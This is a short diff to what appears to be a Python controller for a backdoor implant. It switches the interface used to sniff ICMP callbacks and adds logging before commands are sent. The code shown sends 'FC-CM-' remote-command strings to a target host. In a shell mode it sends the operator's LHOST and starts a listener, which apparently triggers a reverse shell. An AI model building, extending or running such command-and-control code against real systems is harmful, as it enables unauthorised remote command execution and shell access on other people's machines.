@@ -84,7 +84,7 @@ def listen(queue):
 def pingListen():
     print(colored(f"[*] Waiting 10 seconds for callbacks.\n", "cyan"))
     pkts = scapy.sniff(
-        iface="Ethernet", filter="icmp", timeout=10
+        iface="bridge101", filter="icmp", timeout=10
     ) 
     tCallbacks = []
 
@@ -339,12 +339,16 @@ def ready(params):
             elif user_cmd == "EXECUTE":
                 if baseparams["MODE"] == "CMD" and verify(cmdparams):
                     plaintext = "FC-CM-{}\00".format(params["COMMAND"])
+                    ip = cmdparams["RHOST"]
+                    print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "green"))
                     execute(plaintext, cmdparams)
                 elif baseparams["MODE"] == "SHELL" and verify(shellparams):
                     plaintext = "FC-SH-{}\00".format(params["LHOST"])
+                    ip = shellparams["RHOST"]
                     queue = multiprocessing.Queue()
                     t = multiprocessing.Process(target=listen, args=(queue,))
                     t.start()
+                    print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "green"))
                     execute(plaintext, shellparams)
                     command = "\r"
                     try:
